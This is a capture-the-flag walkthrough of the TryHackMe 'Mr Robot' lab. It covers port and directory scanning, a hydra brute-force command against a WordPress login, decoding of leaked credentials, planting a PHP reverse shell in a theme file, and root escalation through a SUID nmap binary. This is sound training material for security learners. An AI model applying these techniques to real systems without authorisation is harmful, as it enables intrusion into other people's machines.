Mr Robot CTF
===
###### tags: `THM` `Medium`
###### Link: https://tryhackme.com/room/mrrobot

# Recon

## Nmap
```bash
$ sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn $ip
```
```
PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

### OS
TTL --> Linux

### Detect services
```bash
$ nmap -sCV -p 80,443 $ip
```
```
80/tcp  open  http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open  ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
```

### Well-known vulnerabilities
```bash
$ nmap -Pn -sV -v --script vuln -p 80,443 $ip
```
```
80/tcp  open  http     Apache httpd
| http-enum:
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
| http-enum:
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

```

## Dirsearch | Gobuster

Dirsearch is going to slow, lets try with gobuster
```bash
$ gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It's slow too but we have some results in a few minutes:
![701f7963111334ba6a720c55da66b81a.png](/THM/mrrobot/_resources/701f7963111334ba6a720c55da66b81a.png)

Interesting paths:
```
/intro                (Status: 200) [Size: 516314]
/wp-login             (Status: 200) [Size: 2657]
/license              (Status: 200) [Size: 309]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
```

# Explotation

![7106b69f28f8332d7ee87466f7272a03.png](/THM/mrrobot/_resources/7106b69f28f8332d7ee87466f7272a03.png)

There is a path to a dicctionary hidden in the robots.txt

## Web Autentication
Let's use it to force the wp-login:
```
hydra -l fsocity.dic -p test -v $ip http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.91.194%2Fwp-admin%2F&testcookie=1:Invalid username'
```

Found one user --> **Elliot**

It takes too much time to finish, so asume the user that we need is it.

Looking at the other interesting paths we have:
Nothing in /readme
![472dae3399f636a1c7c580ff536d4dbb.png](/THM/mrrobot/_resources/472dae3399f636a1c7c580ff536d4dbb.png)

But there is something in the /license path:
![0d7c805c485083b98f3e5dfb6d6293a3.png](/THM/mrrobot/_resources/0d7c805c485083b98f3e5dfb6d6293a3.png)

ZWxsaW90OkVSMjgtMDY1Mgo=

elliot:ER28-0652

This user:password works in the /wp-login.php

![8125761235566f76a4815d4dd1c7e3ef.png](/THM/mrrobot/_resources/8125761235566f76a4815d4dd1c7e3ef.png)

## Spawn a shell

We are admins, so we need to modify some page that we can access and put a php reverse shell:

![5679f8a5fdd16e8de45997ba1f557b98.png](/THM/mrrobot/_resources/5679f8a5fdd16e8de45997ba1f557b98.png)

![19d398a7345e850336470290947cbd21.png](/THM/mrrobot/_resources/19d398a7345e850336470290947cbd21.png)

http://10.10.58.91/wp-content/themes/twentyseventeen/404.php
![b2f03ea0b49798c4e3341e5f5fec786d.png](/THM/mrrobot/_resources/b2f03ea0b49798c4e3341e5f5fec786d.png)

Put the reverse shell:
![9bbfbf3a57b3f2e12b3476f93e43c1f3.png](/THM/mrrobot/_resources/9bbfbf3a57b3f2e12b3476f93e43c1f3.png)

And it's done:
![cafc991c7ec529c40363cb0b3dae541d.png](/THM/mrrobot/_resources/cafc991c7ec529c40363cb0b3dae541d.png)

# Post-explotation

### SUID
```bash
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
```
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 69120 Feb 12  2015 /bin/umount
-rwsr-xr-x 1 root root 94792 Feb 12  2015 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 36936 Feb 17  2014 /bin/su
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-touchlock
-rwsr-xr-x 1 root root 47032 Feb 17  2014 /usr/bin/passwd
-rwsr-xr-x 1 root root 32464 Feb 17  2014 /usr/bin/newgrp
-rwxr-sr-x 1 root utmp 421768 Nov  7  2013 /usr/bin/screen
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-unlock
-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-lock
-rwsr-xr-x 1 root root 41336 Feb 17  2014 /usr/bin/chsh
-rwxr-sr-x 1 root crontab 35984 Feb  9  2013 /usr/bin/crontab
-rwsr-xr-x 1 root root 46424 Feb 17  2014 /usr/bin/chfn
-rwxr-sr-x 1 root shadow 54968 Feb 17  2014 /usr/bin/chage
-rwsr-xr-x 1 root root 68152 Feb 17  2014 /usr/bin/gpasswd
-rwxr-sr-x 1 root shadow 23360 Feb 17  2014 /usr/bin/expiry
-rwxr-sr-x 1 root mail 14856 Dec  7  2013 /usr/bin/dotlockfile
-rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
-rwxr-sr-x 1 root ssh 284784 May 12  2014 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 19024 Feb 12  2015 /usr/bin/wall
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
-r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
-r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 10344 Feb 25  2015 /usr/lib/pt_chown
-rwxr-sr-x 1 root shadow 35536 Jan 31  2014 /sbin/unix_chkpwd
```

https://gtfobins.github.io/gtfobins/nmap/

![73b8a10ae6061b911a0e49c74653dcf2.png](/THM/mrrobot/_resources/73b8a10ae6061b911a0e49c74653dcf2.png)

**I think I forgot one step... I obtain two flags in a row**

## User flag
Let's see how they want I reach the user flag:

The flag is under robot user home:
![ab2931532dcafa185e320e921c2858ae.png](/THM/mrrobot/_resources/ab2931532dcafa185e320e921c2858ae.png)

I don't have permissions to read it, but there is other file that I can read:
![e8e56e9cbeae53f02c86e5d3cfb52cfe.png](/THM/mrrobot/_resources/e8e56e9cbeae53f02c86e5d3cfb52cfe.png)

robot:c3fcd3d76192e4007dfb496cca67e13b

That seems an md5 hash, and it is:
![87d310c27049882dd3a2582ebb3d5437.png](/THM/mrrobot/_resources/87d310c27049882dd3a2582ebb3d5437.png)

Lets use the credentials to login with the user robot and read the user flag witouth root:
![6f74b03ff96c3ee3b47cc2ba314719b8.png](/THM/mrrobot/_resources/6f74b03ff96c3ee3b47cc2ba314719b8.png)

Done!
